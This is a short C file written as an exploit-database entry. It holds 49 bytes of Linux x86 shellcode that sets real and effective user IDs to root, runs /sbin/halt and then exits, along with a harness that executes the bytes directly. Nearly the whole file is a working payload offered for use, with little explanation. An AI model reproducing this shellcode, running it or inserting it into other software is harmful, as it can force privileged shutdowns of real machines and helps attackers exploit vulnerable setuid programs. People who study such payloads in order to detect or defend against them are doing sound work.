/*

+========================================================================================
| # Exploit Title  : linux/x86 setreuid(0, 0) + execve("/sbin/halt") + exit(0) - 49 bytes
| # Exploit Author : Febriyanto Nugroho
| # Tested on      : Linux Debian 5.0.5
+========================================================================================

 */

#include <stdio.h>
#include <string.h>

char s[] = "\x31\xc0\x31\xdb\x50\x53\x89\xe1"
           "\xb0\x46\xcd\x80\x31\xc0\x50\x68"
           "\x68\x61\x6c\x74\x68\x6e\x2f\x2f"
           "\x2f\x68\x2f\x73\x62\x69\x89\xe3"
           "\x50\x53\xb0\x0b\x89\xe1\xcd\x80"
           "\x31\xc0\x50\x89\xe3\xb0\x01\xcd"
           "\x80";

int main(int argc, char *argv[]) {
printf("shellcode length -> %d bytes\n", strlen(s));
int(*fuck)() = (int(*)())s;
fuck();
return 0;
}